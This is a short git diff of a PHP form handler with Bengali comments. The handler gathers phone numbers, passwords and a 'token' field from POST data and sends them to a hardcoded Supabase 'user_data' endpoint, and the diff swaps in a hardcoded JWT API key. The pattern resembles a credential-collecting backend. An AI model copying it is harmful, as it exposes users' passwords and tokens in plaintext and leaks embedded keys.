@@ -1,7 +1,7 @@
 <?php
 // ১. Supabase এর তথ্য সেট করা
 $url = "https://hglekeepnigvpvsvazdb.supabase.co/rest/v1/user_data";
-$apiKey = "sb_publishable_BYyYGnXd6L5YY_O8tnp2IQ_DtORlYVF";
+$apiKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImhnbGVrZWVwbmlndnB2c3ZhemRiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzMwMDc2NDEsImV4cCI6MjA4ODU4MzY0MX0.8PZYtqGgWUkhjJtP3Gp9OzcforLyM7L2U5bgDkrWwxA";
 
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
     // ২. ফর্ম থেকে ডাটা সংগ্রহ করা
@@ -9,7 +9,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $password = isset($_POST['password']) ? $_POST['password'] : "";
     $token    = isset($_POST['token']) ? $_POST['token'] : "";
 
-    // ৩. ডাটাবেসে পাঠানোর জন্য ডাটা তৈরি করা
+    // ৩. ডাটাবেসে পাঠানোর জন্য ডাটা ফরম্যাট করা
     $data = [
         "phone"    => $phone,
         "password" => $password,
